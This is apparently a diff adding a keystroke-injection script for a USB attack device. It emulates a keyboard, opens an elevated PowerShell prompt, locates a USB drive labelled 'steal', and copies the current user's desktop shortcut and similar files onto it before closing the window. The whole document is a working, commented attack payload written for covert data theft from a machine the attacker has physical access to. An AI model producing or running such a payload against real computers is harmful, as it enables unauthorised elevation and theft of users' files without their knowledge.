@@ -1,0 +1,23 @@
+layout('us');			// US keyboard layout
+typingSpeed(50,50)	// Wait 50ms between key strokes + an additional random value between 0ms and 50ms
+
+
+press("GUI r");           //
+delay(150);               //
+type("powershell");       // Opens powershell
+press("CTRL SHIFT ENTER") //
+press("ENTER");           //
+delay(500);               //
+
+
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'steal' } | select name\n") // Get a mounted drive with the name "steal" and put in in usbPath variable
+
+var filetypes = ["lnk", "url", "cda"] // Targets lnk, url, and cda files types to copy
+ 
+for (var i = 0; i < filetypes.length; i++) {                                           //
+    type("copy C:/Users/$env:UserName/Desktop/*." + filetypes[i] + " $usbpath.name\n") // Copys files from the active user's desktop
+}                                                                                      //
+
+
+delay(1000);     //
+type("exit\n");  // exits
